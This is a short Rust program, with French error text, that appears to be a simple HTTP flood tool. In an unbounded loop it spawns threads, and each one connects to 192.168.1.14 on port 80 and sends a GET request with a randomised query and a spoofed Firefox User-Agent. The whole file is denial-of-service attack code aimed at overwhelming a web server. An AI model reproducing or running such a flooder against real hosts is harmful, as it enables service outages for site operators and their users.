use std::fmt::Error;
use std::io::Write;
use std::net::{SocketAddr, TcpStream};
use std::thread;
use rand::Rng;

fn main () {

    let addr = [
        SocketAddr::from(([192,168,1,14], 80)),
    ];

    loop {

        thread::spawn(move || {
            let mut rng = rand::thread_rng();

            let mut connection = TcpStream::connect(&addr[..])
                .expect("Impossible de se connecter");
            connection.write_all(
                format!(
                    "GET /?{} HTTP/1.1\r\nHost: 127.0.0.1\r\nUser-Agent: {}\r\nConnection: keep-alive\r\n\r\n",
                    rng.gen::<i8>(),
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0"
                ).as_bytes(),
            );
        });

    }


}